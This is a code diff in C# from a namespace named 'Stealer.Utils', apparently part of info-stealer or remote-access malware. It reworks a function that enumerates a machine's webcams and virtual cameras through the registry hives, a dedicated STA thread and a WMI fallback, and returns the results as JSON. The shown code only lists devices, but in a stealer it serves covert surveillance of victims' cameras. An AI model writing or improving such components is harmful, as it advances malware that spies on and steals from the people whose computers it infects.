@@ -60,80 +60,74 @@ namespace Stealer.Utils
 
         public static string GetCameraListJson()
         {
+            // DirectShow COM requires STA — run on dedicated STA thread
+            string result = "[]";
+            var t = new Thread(() => { result = EnumerateCamerasOnSta(); });
+            t.SetApartmentState(ApartmentState.STA);
+            t.IsBackground = true;
+            t.Start();
+            t.Join(8000);
+            return result;
+        }
+
+        private static string EnumerateCamerasOnSta()
+        {
             var list = new System.Collections.Generic.List<string>();
 
-            // Primary: read directly from registry (works for all DirectShow devices including OBS Virtual Camera)
-            try
+            // Primary: registry — covers all DirectShow devices (OBS Virtual Camera, physical webcams, etc.)
+            // Check both HKLM and HKCU since some virtual devices register per-user
+            const string regPath = @"SOFTWARE\Classes\CLSID\{860BB310-5D01-11d0-BD3B-00A0C911CE86}\Instance";
+            var hives = new[] { Microsoft.Win32.Registry.LocalMachine, Microsoft.Win32.Registry.CurrentUser };
+            int index = 0;
+            foreach (var hive in hives)
             {
-                // Video input devices are registered under this CLSID category in the registry
-                const string basePath = @"SOFTWARE\Classes\CLSID\{860BB310-5D01-11d0-BD3B-00A0C911CE86}\Instance";
-                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(basePath))
+                try
                 {
-                    if (key != null)
+                    using (var key = hive.OpenSubKey(regPath))
                     {
-                        int index = 0;
-                        foreach (string subKeyName in key.GetSubKeyNames())
+                        if (key == null) continue;
+                        foreach (string sub in key.GetSubKeyNames())
                         {
                             try
                             {
-                                using (var devKey = key.OpenSubKey(subKeyName))
+                                string name = null;
+                                using (var devKey = key.OpenSubKey(sub))
+                                    name = devKey?.GetValue("FriendlyName") as string;
+
+                                if (string.IsNullOrWhiteSpace(name))
                                 {
-                                    if (devKey == null) continue;
-                                    string name = devKey.GetValue("FriendlyName") as string;
-                                    if (string.IsNullOrWhiteSpace(name))
-                                    {
-                                        // Try reading from the device CLSID key directly
-                                        using (var clsidKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Classes\CLSID\" + subKeyName))
-                                            name = clsidKey?.GetValue("") as string ?? clsidKey?.GetValue("FriendlyName") as string;
-                                    }
-                                    if (!string.IsNullOrWhiteSpace(name))
-                                    {
-                                        name = name.Trim().Replace("\\", "\\\\").Replace("\"", "\\\"");
-                                        list.Add("{\"id\":" + index + ",\"name\":\"" + name + "\"}");
-                                        index++;
-                                    }
+                                    using (var clsidKey = hive.OpenSubKey(@"SOFTWARE\Classes\CLSID\" + sub))
+                                        name = clsidKey?.GetValue("FriendlyName") as string
+                                            ?? clsidKey?.GetValue("") as string;
+                                }
+
+                                if (!string.IsNullOrWhiteSpace(name))
+                                {
+                                    name = name.Trim().Replace("\\", "\\\\").Replace("\"", "\\\"");
+                                    list.Add("{\"id\":" + index + ",\"name\":\"" + name + "\"}");
+                                    index++;
                                 }
                             }
                             catch { }
                         }
                     }
                 }
-            }
-            catch { }
-
-            // Fallback: avicap32 legacy enumeration
-            if (list.Count == 0)
-            {
-                byte[] nameBuf = new byte[256];
-                byte[] verBuf = new byte[256];
-                for (ushort i = 0; i < 10; i++)
-                {
-                    Array.Clear(nameBuf, 0, nameBuf.Length);
-                    Array.Clear(verBuf, 0, verBuf.Length);
-                    if (capGetDriverDescriptionA(i, nameBuf, nameBuf.Length, verBuf, verBuf.Length))
-                    {
-                        string name = System.Text.Encoding.ASCII.GetString(nameBuf).TrimEnd('\0', ' ', '\r', '\n');
-                        if (!string.IsNullOrEmpty(name))
-                        {
-                            name = name.Replace("\\", "\\\\").Replace("\"", "\\\"");
-                            list.Add("{\"id\":" + i + ",\"name\":\"" + name + "\"}");
-                        }
-                    }
-                }
+                catch { }
             }
 
-            // Fallback: WMI physical cameras
+
+            // Fallback: WMI (physical cameras only, not virtual)
             if (list.Count == 0)
             {
                 try
                 {
-                    using (var searcher = new System.Management.ManagementObjectSearcher(
+                    using (var s = new System.Management.ManagementObjectSearcher(
                         "SELECT * FROM Win32_PnPEntity WHERE PNPClass = 'Camera' OR PNPClass = 'Image'"))
                     {
                         int idx = 0;
-                        foreach (var device in searcher.Get())
+                        foreach (var d in s.Get())
                         {
-                            string caption = device["Caption"]?.ToString();
+                            string caption = d["Caption"]?.ToString();
                             if (!string.IsNullOrEmpty(caption))
                             {
                                 caption = caption.Replace("\\", "\\\\").Replace("\"", "\\\"");
